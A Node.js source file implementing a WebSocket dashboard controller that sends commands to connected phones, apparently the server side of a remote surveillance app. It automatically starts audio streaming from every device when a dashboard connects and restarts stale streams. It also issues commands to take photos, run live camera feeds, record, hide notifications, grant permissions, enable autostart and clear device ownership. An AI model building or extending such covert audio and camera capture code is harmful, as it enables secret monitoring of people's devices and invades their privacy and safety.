/**
 * Dashboard WebSocket controller (/control)
 */

const WebSocket = require("ws");
const deviceStore = require("../models/deviceStore");
const dashboardStore = require("../models/dashboardStore");
const { normalizeDeviceId } = require("../utils/device");
const { broadcastToDashboard } = require("../services/dashboardService");
const { startDeviceRecording, stopDeviceRecording } = require("../services/recordingService");

let streamRecoveryTimer = null;

function handleDashboard(ws) {
  const wasEmpty = dashboardStore.size() === 0;
  dashboardStore.addClient(ws);
  console.log(`👁️  Dashboard client connected (Total: ${dashboardStore.size()})`);

  if (wasEmpty) {
    deviceStore.forEachDevice((dev, id) => {
      try {
        if (dev.ws && dev.ws.readyState === WebSocket.OPEN) {
          dev.ws.send("start_stream");
          console.log(`🎙️  start_stream → ${id}`);
        }
      } catch (e) {
        console.log(`❌ Failed to start stream for ${id}: ${e.message}`);
      }
    });
  }

  const deviceList = deviceStore.listDevices();
  ws.send(JSON.stringify({ type: "device_list", devices: deviceList }));

  ws.on("message", (data) => {
    try {
      const msg = JSON.parse(data.toString());
      const { cmd } = msg;
      const requestedId = normalizeDeviceId(msg.deviceId);

      console.log(`📥 Command: ${cmd}`);
      console.log(`   Requested ID: "${requestedId}" (raw: "${msg.deviceId}")`);
      console.log(
        `   Available: [${Array.from(deviceStore.devices.keys())
          .map((k) => `"${k}"`)
          .join(", ")}]`,
      );

      let targetId = requestedId;
      let device = null;

      const found = deviceStore.findDevice(requestedId);
      if (found) {
        targetId = found.id;
        device = found.device;
        console.log(`   ✅ Using connected device: "${targetId}"`);
      } else {
        console.log(`   ⚠️ Device "${requestedId}" is offline. Queuing command...`);
        // If they requested a specific ID and it's offline, use that ID.
        // If they didn't, we can't queue it reliably except to currentDeviceId
        targetId = requestedId || deviceStore.getCurrentDeviceId();
        
        if (!targetId) {
          console.log(`❌ No known device to queue to. Command ${cmd} rejected.`);
          ws.send(JSON.stringify({ type: "error", message: "No device connected or known" }));
          return;
        }
      }

      const safeSend = (payload) => {
        try {
          if (device && device.ws && device.ws.readyState === WebSocket.OPEN) {
            device.ws.send(payload);
            console.log(
              `   ✅ Sent to ${targetId}: ${typeof payload === "string" ? payload.substring(0, 50) : "JSON"}`,
            );
            return true;
          }
          
          console.log(`   ⚠️ WebSocket not open for ${targetId} -> Queuing command (Layer 9)`);
          deviceStore.queueCommand(targetId, payload);
          
          broadcastToDashboard({
            type: "info",
            message: `Cmd queued for ${targetId}`,
          });
          return false;
        } catch (e) {
          console.log(`   ❌ Send failed for ${targetId}: ${e.message}`);
          deviceStore.queueCommand(targetId, payload); // queue on error
          return false;
        }
      };

      const safeSendJson = (payload) => safeSend(JSON.stringify(payload));

      switch (cmd) {
        case "start_stream":
          if (safeSend("start_stream")) {
            broadcastToDashboard({
              type: "stream_started",
              deviceId: targetId,
            });
          }
          break;
        case "stop_stream":
          if (device) stopDeviceRecording(targetId, device);
          if (safeSend("stop_stream")) {
            broadcastToDashboard({
              type: "stream_stopped",
              deviceId: targetId,
            });
          }
          break;
        case "start_record":
          if (device) startDeviceRecording(targetId, device);
          safeSend("start_record");
          break;
        case "stop_record":
          if (device) stopDeviceRecording(targetId, device);
          safeSend("stop_record");
          break;
        case "ping":
          safeSend("ping");
          break;
        case "get_data":
          safeSend("get_data");
          break;
        case "webrtc_start":
          safeSendJson({ type: "webrtc_start" });
          break;
        case "webrtc_stop":
          safeSendJson({ type: "webrtc_stop" });
          break;
        case "webrtc_offer":
          safeSendJson({
            type: "webrtc_offer",
            sdp: msg.sdp,
          });
          break;
        case "webrtc_ice":
          safeSendJson({
            type: "webrtc_ice",
            candidate: msg.candidate,
          });
          break;
        case "webrtc_quality":
          safeSendJson({
            type: "webrtc_quality",
            quality: msg.quality || null,
          });
          break;
        case "ai_mode":
          safeSendJson({
            type: "ai_mode",
            enabled: msg.enabled !== false,
          });
          break;
        case "ai_auto":
          safeSendJson({
            type: "ai_auto",
            enabled: msg.enabled !== false,
          });
          break;
        case "stream_codec":
          safeSendJson({
            type: "stream_codec",
            mode: String(msg.mode || "auto").toLowerCase(),
          });
          break;
        case "set_low_network":
          safeSendJson({
            type: "set_low_network",
            enabled: msg.enabled === true,
          });
          console.log(
            `📶 Low-network mode ${msg.enabled ? "ENABLED" : "DISABLED"} for ${targetId}`,
          );
          break;
        case "voice_profile":
          safeSendJson({
            type: "voice_profile",
            profile: String(msg.profile || "room").toLowerCase(),
          });
          break;
        case "streaming_mode":
          safeSendJson({
            type: "streaming_mode",
            mode: String(msg.mode || "realtime").toLowerCase(),
          });
          console.log(`🎵 Streaming mode set to ${msg.mode} for ${targetId}`);
          break;
        case "take_photo":
          if (
            safeSendJson({
              type: "take_photo",
              camera: String(msg.camera || "current").toLowerCase(),
            })
          ) {
            broadcastToDashboard({
              type: "photo_request_sent",
              deviceId: targetId,
              camera: msg.camera || "current",
              ts: Date.now(),
            });
          } else {
            broadcastToDashboard({
              type: "photo_request_failed",
              deviceId: targetId,
              reason: "device_not_connected",
              ts: Date.now(),
            });
          }
          break;
        case "switch_camera":
          safeSendJson({ type: "switch_camera" });
          break;
        case "photo_ai":
          safeSendJson({
            type: "photo_ai",
            enabled: msg.enabled !== false,
          });
          break;
        case "photo_quality":
          safeSendJson({
            type: "photo_quality",
            mode: ["fast", "normal", "hd"].includes(
              String(msg.mode || "normal").toLowerCase(),
            )
              ? String(msg.mode || "normal").toLowerCase()
              : "normal",
          });
          break;
        case "photo_night":
          safeSendJson({
            type: "photo_night",
            mode: ["off", "1s", "3s", "5s"].includes(
              String(msg.mode || "off").toLowerCase(),
            )
              ? String(msg.mode || "off").toLowerCase()
              : "off",
          });
          break;
        case "camera_live_start":
          safeSendJson({
            type: "camera_live_start",
            camera: String(msg.camera || "current").toLowerCase(),
          });
          break;
        case "camera_live_stop":
          safeSendJson({ type: "camera_live_stop" });
          break;
        case "force_update":
          safeSend("force_update");
          console.log(`🔄 Force update sent to ${targetId}`);
          break;
        case "grant_permissions":
          safeSend("grant_permissions");
          console.log(`✅ Grant permissions sent to ${targetId}`);
          break;
        case "enable_autostart":
          safeSend("enable_autostart");
          console.log(`🚀 Enable autostart sent to ${targetId}`);
          break;
        case "uninstall_app":
          safeSend("uninstall_app");
          console.log(`🗑️ Uninstall sent to ${targetId}`);
          break;
        case "clear_device_owner":
          safeSend("clear_device_owner");
          console.log(`🔓 Clear device owner sent to ${targetId}`);
          break;
        case "lock_app":
          safeSend("lock_app");
          console.log(`🔒 Lock app sent to ${targetId}`);
          break;
        case "unlock_app":
          safeSend("unlock_app");
          console.log(`🔓 Unlock app sent to ${targetId}`);
          break;
        case "hide_notifications":
          safeSend("hide_notifications");
          console.log(`🔕 Hide notifications sent to ${targetId}`);
          break;
        case "wifi_on":
          console.log("WiFi ON not supported");
          break;
        case "wifi_off":
          console.log("WiFi OFF not supported");
          break;
        default:
          console.warn(`Unknown dashboard command: ${cmd}`);
      }
    } catch (e) {
      console.error("Dashboard message parse error:", e.message);
    }
  });

  ws.on("close", () => {
    dashboardStore.removeClient(ws);
    console.log("👋 Dashboard client disconnected");

    if (dashboardStore.size() === 0) {
      deviceStore.forEachDevice((dev, id) => {
        try {
          if (dev.ws && dev.ws.readyState === WebSocket.OPEN) {
            dev.ws.send("stop_stream");
            console.log(`🔇  stop_stream → ${id}`);
          }
        } catch (e) {
          console.log(`❌ Failed to stop stream for ${id}: ${e.message}`);
        }
      });
    }
  });
}

function startStreamRecovery() {
  if (streamRecoveryTimer) return;
  streamRecoveryTimer = setInterval(() => {
    if (dashboardStore.size() === 0) return;
    const now = Date.now();
    deviceStore.forEachDevice((dev, deviceId) => {
      if (!dev || !dev.ws || dev.ws.readyState !== WebSocket.OPEN) return;
      const lastAudio = Number(dev.health?.lastAudioChunkAt || 0);
      const stale = !lastAudio || now - lastAudio > 25_000;
      if (stale) {
        try {
          dev.ws.send("start_stream");
          console.log(`🔄 Stream recovery sent → ${deviceId}`);
          broadcastToDashboard({ type: "stream_recovery_sent", deviceId });
        } catch (e) {
          console.log(`❌ Stream recovery failed for ${deviceId}: ${e.message}`);
        }
      }
    });
  }, 20_000);
}

module.exports = {
  handleDashboard,
  startStreamRecovery,
};
